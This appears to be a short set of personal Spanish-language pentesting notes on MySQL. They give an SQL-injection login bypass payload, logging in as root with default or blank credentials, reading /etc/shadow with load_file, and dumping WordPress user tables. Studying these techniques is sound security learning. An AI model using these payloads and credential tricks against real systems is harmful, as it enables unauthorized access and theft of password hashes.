# MySQL

Propietario: Adrian Gisbert Cabello

Para hacer una inyección simple de MySQL en el usuario pondremos lo siguiente: `' OR 1=1;-- -`		y ponemos la contraseña que queramos.

Para entrar mediante el protocolo MySQL: `mysql -u USUARIO -p -h 192.168.X.X` ******→ usuario ***por defecto suele ser root***, no suelen cambiar credenciales por defecto. `mysql -u root -h 192.168.X.X`

Comandos para usar dentro de MySQL:

- `select load_file(¨/etc/shadow¨);`
- `show databases`
- `show tables`
- `;`

Cuando estamos dentro del MySQL estos son algunos de los comandos más importantes:

- Para ver las bases de datos: `show databases`
- Para seleccionar una base de datos: `use <Nombre de la base de datos>` = `use wordpress` → `show databases` → `select * from wp_users`

Credenciales por defecto:

MySQL							root::en blanco		|		root::root